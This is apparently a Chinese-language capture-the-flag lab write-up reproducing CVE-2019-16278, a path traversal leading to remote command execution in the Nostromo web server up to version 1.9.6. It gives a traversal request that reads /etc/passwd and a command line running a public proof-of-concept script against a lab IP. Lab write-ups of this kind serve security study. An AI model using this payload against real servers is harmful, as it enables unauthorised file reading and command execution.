# CVE-2019-16278：Nostromo Web服务器的远程命令执行

web中间件漏洞

【影响版本】

nhttpd：`version <= 1.9.6`

Nostromo由于在验证URL安全性方面存在[缺陷](https://www.owasp.org/index.php/Path_Traversal)，导致目录穿越，任何人都可以遍历系统中任何文件。因此未经过身份验证的远程攻击者可以强制服务器指向`/bin/sh`这样的shell文件，借此执行任意命令。

打开界面是这样的

![image-20211006101101922](C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211006101101922.png)

先用poc验证一下

[下载](https://www.77169.net/downloads)CVE-2019-16278
git clone 

https://github.com/jas502n/CVE-2019-16278
cd CVE-2019-16278
ls

![image-20211006101325982](C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211006101325982.png)

接下来可以利用了

![image-20211006101532696](C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211006101532696.png)

权限不够- -

chmod 赋下目录权限

![image-20211006102754919](C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211006102754919.png)

不知道为什么提示我网页无法打开，但是我浏览器都能打开

多次尝试发现要跟上目录

![image-20211006103016839](C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211006103016839.png)

哦 这样也不行其实

利用网上的poc直接修改get请求

[http://192.168.1.190/..%0D/..%0D/..%0D/..%0D/..%0D/..%0D/etc/passwd](http://127.0.0.1:8080/.. /.. /.. /.. /.. /.. /etc/passwd) 

或者直接用pytho脚本命令执行

python CVE-2019-16278 192.168.1.190 24647 XXX

后面靶场自动关了而且每次打开加载很慢就没有寻找flag

